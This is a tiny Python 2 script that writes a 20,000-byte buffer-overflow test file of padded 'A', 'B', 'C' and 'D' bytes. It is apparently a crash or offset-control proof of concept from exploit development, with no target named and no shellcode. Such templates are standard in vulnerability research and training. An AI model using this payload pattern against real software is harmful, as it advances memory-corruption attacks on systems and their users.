#!/usr/bin/python

f = file('payload.txt','w')

payload  = "A" * 404
payload += "B" * 4
payload += "C" * 4
payload += "D" * (20000 - len(payload))

f.write(payload)
f.close()

